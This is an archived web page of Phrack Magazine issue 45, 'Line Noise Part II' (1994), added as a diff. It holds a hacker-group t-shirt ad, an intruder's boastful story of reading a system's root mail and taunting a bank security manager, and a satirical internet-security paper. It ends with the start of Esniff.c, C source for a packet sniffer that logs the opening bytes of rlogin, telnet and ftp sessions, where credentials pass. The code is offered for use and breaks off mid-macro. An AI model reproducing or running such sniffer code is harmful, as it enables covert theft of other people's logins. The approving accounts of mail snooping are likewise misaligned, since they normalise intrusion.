@@ -1,0 +1,1607 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+   <meta http-equiv="content-language" content="en" />
+   <meta name="description" content="Phrack staff website." />
+   <meta name="keywords" content="phrack" />
+   <meta name="robots" content="follow,index,all" />
+
+   <meta name="revisit-after" content="7 days" />
+   
+   <title>.:: Phrack Magazine ::.</title>
+   
+   <link href="../../css/style.css" rel="stylesheet" type="text/css">
+</head>
+<body id="top">
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+
+</div>
+
+<center>
+   <br>
+   <br>
+   <img width="600" src="../../images/phrack-logo.jpg" alt="..[ Phrack Magazine ]..">
+   <br>
+
+   <div class="texto-2">
+   <div class="p-title">.:: Line Noise Part II ::.</div>
+   <hr width="600" />
+   </div>
+   
+   <div style="padding-top: 4px; padding-bottom: 4px;">
+<div class="around">
+
+<div class="details"><strong>Issues</strong>: 
+[ <a href="../../issues/1/1.html" title="Issue 1">1</a> ] [ <a href="../../issues/2/1.html" title="Issue 2">2</a> ] [ <a href="../../issues/3/1.html" title="Issue 3">3</a> ] [ <a href="../../issues/4/1.html" title="Issue 4">4</a> ] [ <a href="../../issues/5/1.html" title="Issue 5">5</a> ] [ <a href="../../issues/6/1.html" title="Issue 6">6</a> ] [ <a href="../../issues/7/1.html" title="Issue 7">7</a> ] [ <a href="../../issues/8/1.html" title="Issue 8">8</a> ] [ <a href="../../issues/9/1.html" title="Issue 9">9</a> ] [ <a href="../../issues/10/1.html" title="Issue 10">10</a> ] [ <a href="../../issues/11/1.html" title="Issue 11">11</a> ] [ <a href="../../issues/12/1.html" title="Issue 12">12</a> ] [ <a href="../../issues/13/1.html" title="Issue 13">13</a> ] [ <a href="../../issues/14/1.html" title="Issue 14">14</a> ] [ <a href="../../issues/15/1.html" title="Issue 15">15</a> ] [ <a href="../../issues/16/1.html" title="Issue 16">16</a> ] [ <a href="../../issues/17/1.html" title="Issue 17">17</a> ] [ <a href="../../issues/18/1.html" title="Issue 18">18</a> ] [ <a href="../../issues/19/1.html" title="Issue 19">19</a> ] [ <a href="../../issues/20/1.html" title="Issue 20">20</a> ] [ <a href="../../issues/21/1.html" title="Issue 21">21</a> ] [ <a href="../../issues/22/1.html" title="Issue 22">22</a> ] [ <a href="../../issues/23/1.html" title="Issue 23">23</a> ] [ <a href="../../issues/24/1.html" title="Issue 24">24</a> ] [ <a href="../../issues/25/1.html" title="Issue 25">25</a> ] [ <a href="../../issues/26/1.html" title="Issue 26">26</a> ] [ <a href="../../issues/27/1.html" title="Issue 27">27</a> ] [ <a href="../../issues/28/1.html" title="Issue 28">28</a> ] [ <a href="../../issues/29/1.html" title="Issue 29">29</a> ] [ <a href="../../issues/30/1.html" title="Issue 30">30</a> ] [ <a href="../../issues/31/1.html" title="Issue 31">31</a> ] [ <a href="../../issues/32/1.html" title="Issue 32">32</a> ] [ <a href="../../issues/33/1.html" title="Issue 33">33</a> ] [ <a href="../../issues/34/1.html" title="Issue 34">34</a> ] [ <a href="../../issues/35/1.html" title="Issue 35">35</a> ] [ <a href="../../issues/36/1.html" title="Issue 36">36</a> ] [ <a href="../../issues/37/1.html" title="Issue 37">37</a> ] [ <a href="../../issues/38/1.html" title="Issue 38">38</a> ] [ <a href="../../issues/39/1.html" title="Issue 39">39</a> ] [ <a href="../../issues/40/1.html" title="Issue 40">40</a> ] [ <a href="../../issues/41/1.html" title="Issue 41">41</a> ] [ <a href="../../issues/42/1.html" title="Issue 42">42</a> ] [ <a href="../../issues/43/1.html" title="Issue 43">43</a> ] [ <a href="../../issues/44/1.html" title="Issue 44">44</a> ] [ <a class="current" href="../../issues/45/1.html" title="Issue 45">45</a> ] [ <a href="../../issues/46/1.html" title="Issue 46">46</a> ] [ <a href="../../issues/47/1.html" title="Issue 47">47</a> ] [ <a href="../../issues/48/1.html" title="Issue 48">48</a> ] [ <a href="../../issues/49/1.html" title="Issue 49">49</a> ] [ <a href="../../issues/50/1.html" title="Issue 50">50</a> ] [ <a href="../../issues/51/1.html" title="Issue 51">51</a> ] [ <a href="../../issues/52/1.html" title="Issue 52">52</a> ] [ <a href="../../issues/53/1.html" title="Issue 53">53</a> ] [ <a href="../../issues/54/1.html" title="Issue 54">54</a> ] [ <a href="../../issues/55/1.html" title="Issue 55">55</a> ] [ <a href="../../issues/56/1.html" title="Issue 56">56</a> ] [ <a href="../../issues/57/1.html" title="Issue 57">57</a> ] [ <a href="../../issues/58/1.html" title="Issue 58">58</a> ] [ <a href="../../issues/59/1.html" title="Issue 59">59</a> ] [ <a href="../../issues/60/1.html" title="Issue 60">60</a> ] [ <a href="../../issues/61/1.html" title="Issue 61">61</a> ] [ <a href="../../issues/62/1.html" title="Issue 62">62</a> ] [ <a href="../../issues/63/1.html" title="Issue 63">63</a> ] [ <a href="../../issues/64/1.html" title="Issue 64">64</a> ] [ <a href="../../issues/65/1.html" title="Issue 65">65</a> ] [ <a href="../../issues/66/1.html" title="Issue 66">66</a> ] [ <a href="../../issues/67/1.html" title="Issue 67">67</a> ] [ <a href="../../issues/68/1.html" title="Issue 68">68</a> ] [ <a href="../../issues/69/1.html" title="Issue 69">69</a> ] [ <a href="../../issues/70/1.html" title="Issue 70">70</a> ] [ <a href="../../issues/71/1.html" title="Issue 71">71</a> ] 
+</div>
+<div class="opt" align="center"><div class="rt"><a href="../../archives/tgz/phrack45.tar.gz" title="Get current issue tar.gz">Get tar.gz</a></div><strong>Current issue</strong> : #<a href="../../archives/tgz/phrack45.tar.gz" title="Get current issue tar.gz">45</a> | <strong>Release date</strong> : <b>1994-03-30</b> | <strong>Editor</strong> : <b>Erik Bloodaxe</b></div>
+
+<div style="border-top: 1px solid black; border-bottom: 2px solid black">
+<table class="tissue" cellpadding="0" cellspacing="0">
+   <tbody>
+      <tr><td align="left"><a href="../../issues/45/1.html#article">Introduction</a></td><td align="right">Erik Bloodaxe</td></tr>
+<tr><td align="left"><a href="../../issues/45/2.html#article">Phrack Loopback Part I</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/45/3.html#article">Phrack Loopback Part II / Editorial</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/45/4.html#article">Line Noise Part I</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/45/5.html#article">Line Noise Part II</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/45/6.html#article">Line Noise Part III</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/45/7.html#article">Phrack Prophile on Control C</a></td><td align="right">Control C</td></tr>
+<tr><td align="left"><a href="../../issues/45/8.html#article">Running a BBS on X.25</a></td><td align="right">Seven Up</td></tr>
+<tr><td align="left"><a href="../../issues/45/9.html#article">No Time for Goodbyes</a></td><td align="right">Emmanuel Goldstein</td></tr>
+<tr><td align="left"><a href="../../issues/45/10.html#article">Security Guidelines</a></td><td align="right">unknown</td></tr>
+<tr><td align="left"><a href="../../issues/45/11.html#article">Ho Ho Con Miscellany</a></td><td align="right">various</td></tr>
+<tr><td align="left"><a href="../../issues/45/12.html#article">Quentin Strikes Again</a></td><td align="right">White Knight &amp; The Omega</td></tr>
+<tr><td align="left"><a href="../../issues/45/13.html#article">10th Chaos Computer Congress</a></td><td align="right">Manny E. Farber</td></tr>
+<tr><td align="left"><a href="../../issues/45/14.html#article">Defcon II information</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/45/15.html#article">VMS Information</a></td><td align="right">various</td></tr>
+<tr><td align="left"><a href="../../issues/45/16.html#article">DCL BBS PROGRAM</a></td><td align="right">Raoul</td></tr>
+<tr><td align="left"><a href="../../issues/45/17.html#article">Hollywood-Style Bits &amp; Bytes</a></td><td align="right">Richard Goodwin</td></tr>
+<tr><td align="left"><a href="../../issues/45/18.html#article">Fraudulent Applications of 900 Services</a></td><td align="right">Codec</td></tr>
+<tr><td align="left"><a href="../../issues/45/19.html#article">Screwing Over Your Local McDonald's</a></td><td align="right">Charlie X</td></tr>
+<tr><td align="left"><a href="../../issues/45/20.html#article">The Senator Markey Hearing Transcripts</a></td><td align="right">unknown</td></tr>
+<tr><td align="left"><a href="../../issues/45/21.html#article">The Universal Data Converter</a></td><td align="right">Maldoror</td></tr>
+<tr><td align="left"><a href="../../issues/45/22.html#article">BOX.EXE - Box Program for Sound Blaster</a></td><td align="right">The Fixer</td></tr>
+<tr><td align="left"><a href="../../issues/45/23.html#article">Introduction To Octel's ASPEN</a></td><td align="right">Optik Nerve</td></tr>
+<tr><td align="left"><a href="../../issues/45/24.html#article">Radio Free Berkeley Information</a></td><td align="right">unknown</td></tr>
+<tr><td align="left"><a href="../../issues/45/25.html#article">The MCX7700 PABX System</a></td><td align="right">Dr. Delam</td></tr>
+<tr><td align="left"><a href="../../issues/45/26.html#article">Cellular Debug Mode Commands</a></td><td align="right">various</td></tr>
+<tr><td align="left"><a href="../../issues/45/27.html#article">International Scenes</a></td><td align="right">various</td></tr>
+<tr><td align="left"><a href="../../issues/45/28.html#article">Phrack World News</a></td><td align="right">Datastream Cowboy</td></tr>
+
+   </tbody>
+</table>
+
+<div class="opt" id="article"><strong>Title</strong> : Line Noise Part II</div>
+<div class="opt-bottom"> <strong>Author</strong> : Phrack Staff</div>
+<pre>                         ==Phrack Magazine==
+
+              Volume Five, Issue Forty-Five, File 5 of 28
+
+
+                           //   //  /\   //   ====
+                          //   //  //\\ //   ====
+                         ==== //  //  \\/   ====
+
+                     /\   //  // \\    //  /===   ====
+                    //\\ //  //   //  //   \=\   ====
+                   //  \\/    \\ //  //   ===/  ====
+
+                               PART II
+
+------------------------------------------------------------------------------
+
+After a complete sellout at HoHo Con 1993 in Austin, TX this past
+December, the official Legion of Doom t-shirts are available
+once again.  Join the net luminaries world-wide in owning one of
+these amazing shirts.  Impress members of the opposite sex, increase
+your IQ, annoy system administrators, get raided by the government and
+lose your wardrobe!
+
+Can a t-shirt really do all this?  Of course it can!
+
+--------------------------------------------------------------------------
+
+&quot;THE HACKER WAR  --  LOD vs MOD&quot;
+
+This t-shirt chronicles the infamous &quot;Hacker War&quot; between rival
+groups The Legion of Doom and  The Masters of Destruction.  The front
+of the shirt displays a flight map of the various battle-sites
+hit by MOD and tracked by LOD.  The back of the shirt
+has a detailed timeline of the key dates in the conflict, and
+a rather ironic quote from an MOD member.
+
+(For a limited time, the original is back!)
+
+&quot;LEGION OF DOOM  --  INTERNET WORLD TOUR&quot;
+
+The front of this classic shirt displays &quot;Legion of Doom Internet World
+Tour&quot; as well as a sword and telephone intersecting the planet
+earth, skull-and-crossbones style.  The back displays the
+words &quot;Hacking for Jesus&quot; as well as a substantial list of &quot;tour-stops&quot;
+(internet sites) and a quote from Aleister Crowley.
+
+--------------------------------------------------------------------------
+
+All t-shirts are sized XL, and are 100% cotton.
+
+Cost is $15.00 (US) per shirt.  International orders add $5.00 per shirt for
+postage.
+
+Send checks or money orders.  Please, no credit cards, even if
+it's really your card.
+
+
+Name:       __________________________________________________
+
+Address:    __________________________________________________
+
+City, State, Zip:   __________________________________________
+
+
+I want ____ &quot;Hacker War&quot; shirt(s)
+
+I want ____ &quot;Internet World Tour&quot; shirt(s)
+
+Enclosed is $______ for the total cost.
+
+
+Mail to:   Chris Goggans
+           603 W. 13th #1A-278
+           Austin, TX 78701
+
+
+These T-shirts are sold only as a novelty items, and are in no way
+attempting to glorify computer crime.
+
+------------------------------------------------------------------------------
+
+My dealing with MBNA - VaxBuster March 8, 1994
+----------------------------------------------
+
+ A friend approached me on Unphamiliar Terrorities with a pretty
+funny message.  It turns out that a high-up executive in MBNA sent mail to
+root at system with public temporary directories, where an issue of Phrack
+44 was stored.  My friend was monitoring root's mail, when he came across
+the following message.
+
+To: root@&lt;censored&gt;
+Message-Id:  &lt;9401141340.aa09874@krusty.ee.udel.edu&gt;
+Status: RO
+
+Hello, The reason I am sending this message to you is an article
+that seems to have been on your system &lt;censored&gt;.  I am an Information
+Security Assurance manager at the largest issuer of Goldcard Mastercard
+and Visa's in the world &quot;MBNA America&quot;.  The article seems to be a
+copy or issue of &quot;Phrack Magazine&quot; written by &quot;Vaxbuster&quot;.  It
+describes in detail how one could defraud credit card companies.  I
+have talked with the CERT People in CMU to see if I could get a
+contact at your UNIV.  There may be an additional 21 or so of these
+articles that I would love to get ahold of to protect my company.
+Please, if you can, send me your phone number so I can talk with you
+in more detail.  My phone number at MBNA in Delaware is &lt;censored&gt;.
+
+I can verify whatever information you may require over the phone or in
+writing.
+
+Thank you for your help.
+
+PS.  We do not have a gateway or firewall to the Internet from here so
+the good People at UofDE allow me to have access from there systems.
+
+MBNA America Bank, NA.
+400 Christiana Road
+Newark, DE 19713
+
+     Anyways, a couple people suggested that I call, and at first I
+thought that was a ridiculous idea, but I figured, what the hell, it may
+be funny. So NightStriker and I called him at his office one day in
+Mid-February.  I was surprized he answered, and not a secretary,
+considering his position.  I asked for him, and identified myself as
+VaxBuster. He shocked the hell out of me, because I really didn't
+expect him to immediately recognize my handle.  He says, &quot;Oh hey! how are
+you doing?&quot;  I told him I'd been monitoring mail, and came across his
+message.  The main reason why I was calling was because he had mentioned
+he wanted 'more info' to protect his company.  NTS and I were more than happy
+to answer any of his questions - but he said that he had obtained all of the
+issues.  Although he said he had all of them, I highly doubt it, because he
+said he had like 20-some issues, and we told him there was 44.  We chatted
+for about 15 more minutes, just about the reasons for publishing and not
+publishing such an article.  He said &quot;Some little kid is going to find this
+article and get his fingers burned&quot; I could tell he was kind of pressured for
+time, so we kind of let it go at that, and he asked for our numbers to call us
+back.  Oh, when I first called him, I didn't tell him I had a friend on the
+line, and he asked, &quot;Is there an echo here?&quot; hahahaha. Pretty funny.  We
+told him NTS was there.  So, when he asked for our numbers, we laughed out
+loud.  I guess he doesn't really understand the secrecy we all so dearly
+cheerish.  He said, &quot;Well, I have caller id, so I have your numbers anyways&quot;
+Bahahhahahaha. Yeah, right.  We told him we were bouncing our call through
+a satellite in Japan.  He thought we were joking.  Guess he doesn't understand
+boxing huh?  Maybe we should show him some of Tabas's files. heh.  We told him
+we would call him back - which we haven't yet, but soon will.  By the way, he
+complimented me on the quality of the article and how detailed it was. :)
+
+     Incidentally, for those of you who've lived in a cave, this is all
+in reference to an article of mine published in Phrack 44 called 'Safe and
+Easy Carding.'
+
+And for all of you who didn't like my article - Fuck you.
+Greets out to all the eleets - Later.
+
+VaxBuster '94
+
+
+------------------------------------------------------------------------------
+
+        A Guide to Internet Security: Becoming an Uebercracker
+        and Becoming an UeberAdmin to stop Uebercrackers.
+
+
+Author: Christopher Klaus &lt;cklaus@shadow.net&gt;
+Date: December 5th, 1993.
+Version: 1.1
+
+  This is a paper will be broken into two parts, one showing 15 easy steps
+to becoming a uebercracker and the next part showing how to become a
+ueberadmin and how to stop a uebercracker.  A uebercracker is a term phrased
+by Dan Farmer to refer to some elite (cr/h)acker that is practically
+impossible to keep out of the networks.
+
+Here's the steps to becoming a uebercracker.
+
+Step 1. Relax and remain calm. Remember YOU are a Uebercracker.
+
+Step 2. If you know a little Unix, you are way ahead of the crowd and skip
+past step 3.
+
+Step 3. You may want to buy Unix manual or book to let you know what
+ls,cd,cat does.
+
+Step 4. Read Usenet for the following groups: alt.irc, alt.security,
+comp.security.unix.  Subscribe to Phrack@well.sf.ca.us to get a background
+in uebercracker culture.
+
+Step 5. Ask on alt.irc how to get and compile the latest IRC client and
+connect to IRC.
+
+Step 6. Once on IRC, join the #hack channel. (Whew, you are half-way
+there!)
+
+Step 7. Now, sit on #hack and send messages to everyone in the channel
+saying &quot;Hi, What's up?&quot;. Be obnoxious to anyone else that joins and asks
+questions like &quot;Why cant I join #warez?&quot;
+
+Step 8. (Important Step) Send private messages to everyone asking for new
+bugs or holes. Here's a good pointer, look around your system for binary
+programs suid root (look in Unix manual from step 3 if confused). After
+finding a suid root binary, (ie. su, chfn, syslog), tell people you have a
+new bug in that program and you wrote a script for it.  If they ask how it
+works, tell them they are &quot;layme&quot;. Remember, YOU are a UeberCracker. Ask
+them to trade for their get-root scripts.
+
+Step 9. Make them send you some scripts before you send some garbage file
+(ie. a big core file). Tell them it is encrypted or it was messed up and
+you need to upload your script again.
+
+Step 10. Spend a week grabbing all the scripts you can. (Don't forget to be
+obnoxious on #hack otherwise people will look down on you and not give you
+anything.)
+
+Step 11. Hopefully you will now have at least one or two scripts that get
+you root on most Unixes. Grab root on your local machines, read your
+admin's mail, or even other user's mail, even rm log files and whatever
+temps you. (look in Unix manual from step 3 if confused).
+
+Step 12. A good test for true uebercrackerness is to be able to fake mail.
+Ask other uebercrackers how to fake mail (because they have had to pass the
+same test). Email your admin how &quot;layme&quot; he is and how you got root and how
+you erased his files, and have it appear coming from satan@evil.com.
+
+Step 13. Now, to pass into supreme eliteness of uebercrackerness, you brag
+about your exploits on #hack to everyone. (Make up stuff, Remember, YOU are
+a uebercracker.)
+
+Step 14. Wait a few months and have all your notes, etc ready in your room
+for when the FBI, Secret Service, and other law enforcement agencies
+confiscate your equipment. Call eff.org to complain how you were innocent
+and how you accidently gotten someone else's account and only looked
+because you were curious. (Whatever else that may help, throw at them.)
+
+Step 15. Now for the true final supreme eliteness of all uebercrackers, you
+go back to #hack and brag about how you were busted.  YOU are finally a
+true Uebercracker.
+
+
+Now the next part of the paper is top secret.  Please only pass to trusted
+administrators and friends and even some trusted mailing lists, Usenet
+groups, etc. (Make sure no one who is NOT in the inner circle of security
+gets this.)
+
+This is broken down on How to Become an UeberAdmin (otherwise know as a
+security expert) and How to stop Uebercrackers.
+
+Step 1. Read Unix manual ( a good idea for admins ).
+
+Step 2. Very Important.  chmod 700 rdist; chmod 644 /etc/utmp. Install
+sendmail 8.6.4.  You have probably stopped 60 percent of all Uebercrackers
+now.  Rdist scripts is among the favorites for getting root by
+uebercrackers.
+
+Step 3. Okay, maybe you want to actually secure your machine from the
+elite Uebercrackers who can break into any site on Internet.
+
+Step 4. Set up your firewall to block rpc/nfs/ip-forwarding/src routing
+packets. (This only applies to advanced admins who have control of the
+router, but this will stop 90% of all uebercrackers from attempting your
+site.)
+
+Step 5. Apply all CERT and vendor patches to all of your machines. You have
+just now killed 95% of all uebercrackers.
+
+Step 6. Run a good password cracker to find open accounts and close them.
+Run tripwire after making sure your binaries are untouched. Run tcp_wrapper
+to find if a uebercracker is knocking on your machines.  Run ISS to make
+sure that all your machines are reasonably secure as far as remote
+configuration (ie. your NFS exports and anon FTP site.)
+
+Step 7. If you have done all of the following, you will have stopped 99%
+of all uebercrackers. Congrats! (Remember, You are the admin.)
+
+Step 8. Now there is one percent of uebercrackers that have gained
+knowledge from reading some security expert's mail (probably gained access
+to his mail via NFS exports or the guest account.  You know how it is, like
+the mechanic that always has a broken car, or the plumber that has the
+broken sink, the security expert usually has an open machine.)
+
+Step 9. Here is the hard part is to try to convince these security experts
+that they are not so above the average citizen and that by now giving out
+their unknown (except for the uebercrackers) security bugs, it would be a
+service to Internet.  They do not have to post it on Usenet, but share
+among many other trusted people and hopefully fixes will come about and
+new pressure will be applied to vendors to come out with patches.
+
+Step 10.  If you have gained the confidence of enough security experts,
+you will know be a looked up to as an elite security administrator that is
+able to stop most uebercrackers.  The final true test for being a ueberadmin
+is to compile a IRC client, go onto #hack and log all the bragging and
+help catch the uebercrackers. If a uebercracker does get into your system,
+and he has used a new method you have never seen, you can probably tell
+your other security admins and get half of the replies like - &quot;That bug
+been known for years, there just isn't any patches for it yet. Here's my
+fix.&quot; and the other half of the replies will be like - &quot;Wow.  That is very
+impressive. You have just moved up a big notch in my security circle.&quot;
+VERY IMPORTANT HERE:  If you see anyone in Usenet's security newsgroups
+mention anything about that security hole, Flame him for discussing it
+since it could bring down Internet and all Uebercrackers will now have it
+and the million other reasons to keep everything secret about security.
+
+
+Well, this paper has shown the finer details of security on Internet. It has
+shown both sides of the coin.  Three points I would like to make that would
+probably clean up most of the security problems on Internet are as the
+following:
+
+1.  Vendors need to make security a little higher than zero in priority.
+If most vendors shipped their Unixes already secure with most known bugs
+that have been floating around since the Internet Worm (6 years ago) fixed
+and patched, then most uebercrackers would be stuck as new machines get
+added to Internet.  (I believe Uebercracker is German for &quot;lame copy-cat
+that can get root with 3 year old bugs.&quot;) An interesting note is that
+if you probably check the mail alias for &quot;security@vendor.com&quot;, you will
+find it points to /dev/null.  Maybe with enough mail, it will overfill
+/dev/null.  (Look in manual if confused.)
+
+2.  Security experts giving up the attitude that they are above the normal
+Internet user and try to give out information that could lead to pressure
+by other admins to vendors to come out with fixes and patches.  Most
+security experts probably don't realize how far their information has
+already  spread.
+
+3.  And probably one of the more important points is just following the
+steps I have outlined for Stopping a Uebercracker.
+
+
+Resources for Security:
+   Many security advisories are available from anonymous ftp cert.org.
+Ask archie to find tcp_wrapper, security programs.  For more information
+about ISS (Internet Security Scanner), email cklaus@shadow.net.
+
+
+Acknowledgments:
+
+   Thanks to the crew on IRC, Dan Farmer, Wietse Venema, Alec Muffet, Scott
+Miles, Scott Yelich, and Henri De Valois.
+
+
+Copyright:
+
+This paper is Copyright 1993, 1994.  Please distribute to only trusted
+people.  If you modify, alter, disassemble, reassemble, re-engineer or have
+any suggestions or comments, please send them to:
+
+cklaus@shadow.net
+
+
+
+------------------------------------------------------------------------------
+
+/* [JOIN THE POSSE!] */
+
+/* Esniff.c */
+
+#include &lt;stdio.h&gt;
+#include &lt;ctype.h&gt;
+#include &lt;string.h&gt;
+
+#include &lt;sys/time.h&gt;
+#include &lt;sys/file.h&gt;
+#include &lt;sys/stropts.h&gt;
+#include &lt;sys/signal.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/ioctl.h&gt;
+
+#include &lt;net/if.h&gt;
+#include &lt;net/nit_if.h&gt;
+#include &lt;net/nit_buf.h&gt;
+#include &lt;net/if_arp.h&gt;
+
+#include &lt;netinet/in.h&gt;
+#include &lt;netinet/if_ether.h&gt;
+#include &lt;netinet/in_systm.h&gt;
+#include &lt;netinet/ip.h&gt;
+#include &lt;netinet/udp.h&gt;
+#include &lt;netinet/ip_var.h&gt;
+#include &lt;netinet/udp_var.h&gt;
+#include &lt;netinet/in_systm.h&gt;
+#include &lt;netinet/tcp.h&gt;
+#include &lt;netinet/ip_icmp.h&gt;
+
+#include &lt;netdb.h&gt;
+#include &lt;arpa/inet.h&gt;
+
+#define ERR stderr
+
+char    *malloc();
+char    *device,
+        *ProgName,
+        *LogName;
+FILE    *LOG;
+int     debug=0;
+
+#define NIT_DEV     &quot;/dev/nit&quot;
+#define CHUNKSIZE   4096        /* device buffer size */
+int     if_fd = -1;
+int     Packet[CHUNKSIZE+32];
+
+void Pexit(err,msg)
+int err; char *msg;
+{ perror(msg);
+  exit(err); }
+
+void Zexit(err,msg)
+int err; char *msg;
+{ fprintf(ERR,msg);
+  exit(err); }
+
+#define IP          ((struct ip *)Packet)
+#define IP_OFFSET   (0x1FFF)
+#define SZETH       (sizeof(struct ether_header))
+#define IPLEN       (ntohs(ip-&gt;ip_len))
+#define IPHLEN      (ip-&gt;ip_hl)
+#define TCPOFF      (tcph-&gt;th_off)
+#define IPS         (ip-&gt;ip_src)
+#define IPD         (ip-&gt;ip_dst)
+#define TCPS        (tcph-&gt;th_sport)
+#define TCPD        (tcph-&gt;th_dport)
+#define IPeq(s,t)   ((s).s_addr == (t).s_addr)
+
+#define TCPFL(FLAGS) (tcph-&gt;th_flags &amp; (FLAGS))
+
+#define MAXBUFLEN  (128)
+time_t  LastTIME = 0;
+
+struct CREC {
+     struct CREC *Next,
+                 *Last;
+     time_t  Time;              /* start time */
+     struct in_addr SRCip,
+                    DSTip;
+     u_int   SRCport,           /* src/dst ports */
+             DSTport;
+     u_char  Data[MAXBUFLEN+2]; /* important stuff :-) */
+     u_int   Length;            /* current data length */
+     u_int   PKcnt;             /* # pkts */
+     u_long  LASTseq;
+};
+
+struct CREC *CLroot = NULL;
+
+char *Symaddr(ip)
+register struct in_addr ip;
+{ register struct hostent *he =
+      gethostbyaddr((char *)&amp;ip.s_addr, sizeof(struct in_addr),AF_INET);
+
+  return( (he)?(he-&gt;h_name):(inet_ntoa(ip)) );
+}
+
+char *TCPflags(flgs)
+register u_char flgs;
+{ static char iobuf[8];
+#define SFL(P,THF,C) iobuf[P]=((flgs &amp; THF)?C:'-')
+
+  SFL(0,TH_FIN, 'F');
+  SFL(1,TH_SYN, 'S');
+  SFL(2,TH_RST, 'R');
+  SFL(3,TH_PUSH,'P');
+  SFL(4,TH_ACK, 'A');
+  SFL(5,TH_URG, 'U');
+  iobuf[6]=0;
+  return(iobuf);
+}
+
+char *SERVp(port)
+register u_int port;
+{ static char buf[10];
+  register char *p;
+
+   switch(port) {
+     case IPPORT_LOGINSERVER: p=&quot;rlogin&quot;; break;
+     case IPPORT_TELNET:      p=&quot;telnet&quot;; break;
+     case IPPORT_SMTP:        p=&quot;smtp&quot;; break;
+     case IPPORT_FTP:         p=&quot;ftp&quot;; break;
+     default: sprintf(buf,&quot;%u&quot;,port); p=buf; break;
+   }
+   return(p);
+}
+
+char *Ptm(t)
+register time_t *t;
+{ register char *p = ctime(t);
+  p[strlen(p)-6]=0; /* strip &quot; YYYY\n&quot; */
+  return(p);
+}
+
+char *NOWtm()
+{ time_t tm;
+  time(&amp;tm);
+  return( Ptm(&amp;tm) );
+}
+
+#define MAX(a,b) (((a)&gt;(b))?(a):(b))
+#define MIN(a,b) (((a)&lt;(b))?(a):(b))
+
+/* add an item */
+#define ADD_NODE(SIP,DIP,SPORT,DPORT,DATA,LEN) { \
+  register struct CREC *CLtmp = \
+        (struct CREC *)malloc(sizeof(struct CREC)); \
+  time( &amp;(CLtmp-&gt;Time) ); \
+  CLtmp-&gt;SRCip.s_addr = SIP.s_addr; \
+  CLtmp-&gt;DSTip.s_addr = DIP.s_addr; \
+  CLtmp-&gt;SRCport = SPORT; \
+  CLtmp-&gt;DSTport = DPORT; \
+  CLtmp-&gt;Length = MIN(LEN,MAXBUFLEN); \
+  bcopy( (u_char *)DATA, (u_char *)CLtmp-&gt;Data, CLtmp-&gt;Length); \
+  CLtmp-&gt;PKcnt = 1; \
+  CLtmp-&gt;Next = CLroot; \
+  CLtmp-&gt;Last = NULL; \
+  CLroot = CLtmp; \
+}
+
+register struct CREC *GET_NODE(Sip,SP,Dip,DP)
+register struct in_addr Sip,Dip;
+register u_int SP,DP;
+{ register struct CREC *CLr = CLroot;
+
+  while(CLr != NULL) {
+    if( (CLr-&gt;SRCport == SP) &amp;&amp; (CLr-&gt;DSTport == DP) &amp;&amp;
+        IPeq(CLr-&gt;SRCip,Sip) &amp;&amp; IPeq(CLr-&gt;DSTip,Dip) )
+            break;
+    CLr = CLr-&gt;Next;
+  }
+  return(CLr);
+}
+
+#define ADDDATA_NODE(CL,DATA,LEN) { \
+ bcopy((u_char *)DATA, (u_char *)&amp;CL-&gt;Data[CL-&gt;Length],LEN); \
+ CL-&gt;Length += LEN; \
+}
+
+#define PR_DATA(dp,ln) {    \
+  register u_char lastc=0; \
+  while(ln-- &gt;0) { \
+     if(*dp &lt; 32) {  \
+        switch(*dp) { \
+            case '\0': if((lastc=='\r') || (lastc=='\n') || lastc=='\0') \
+                        break; \
+            case '\r': \
+            case '\n': fprintf(LOG,&quot;\n     : &quot;); \
+                        break; \
+            default  : fprintf(LOG,&quot;^%c&quot;, (*dp + 64)); \
+                        break; \
+        } \
+     } else { \
+        if(isprint(*dp)) fputc(*dp,LOG); \
+        else fprintf(LOG,&quot;(%d)&quot;,*dp); \
+     } \
+     lastc = *dp++; \
+  } \
+  fflush(LOG); \
+}
+
+void END_NODE(CLe,d,dl,msg)
+register struct CREC *CLe;
+register u_char *d;
+register int dl;
+register char *msg;
+{
+   fprintf(LOG,&quot;\n-- TCP/IP LOG -- TM: %s --\n&quot;, Ptm(&amp;CLe-&gt;Time));
+   fprintf(LOG,&quot; PATH: %s(%s) =&gt;&quot;, Symaddr(CLe-&gt;SRCip),SERVp(CLe-&gt;SRCport));
+   fprintf(LOG,&quot; %s(%s)\n&quot;, Symaddr(CLe-&gt;DSTip),SERVp(CLe-&gt;DSTport));
+   fprintf(LOG,&quot; STAT: %s, %d pkts, %d bytes [%s]\n&quot;,
+                        NOWtm(),CLe-&gt;PKcnt,(CLe-&gt;Length+dl),msg);
+   fprintf(LOG,&quot; DATA: &quot;);
+    { register u_int i = CLe-&gt;Length;
+      register u_char *p = CLe-&gt;Data;
+      PR_DATA(p,i);
+      PR_DATA(d,dl);
+    }
+
+   fprintf(LOG,&quot;\n-- \n&quot;);
+   fflush(LOG);
+
+   if(CLe-&gt;Next != NULL)
+    CLe-&gt;Next-&gt;Last = CLe-&gt;Last;
+   if(CLe-&gt;Last != NULL)
+    CLe-&gt;Last-&gt;Next = CLe-&gt;Next;
+   else
+    CLroot = CLe-&gt;Next;
+   free(CLe);
+}
+
+/* 30 mins (x 60 seconds) */
+#define IDLE_TIMEOUT 1800
+#define IDLE_NODE() { \
+  time_t tm; \
+  time(&amp;tm); \
+  if(LastTIME&lt;tm) { \
+     register struct CREC *CLe,*CLt = CLroot; \
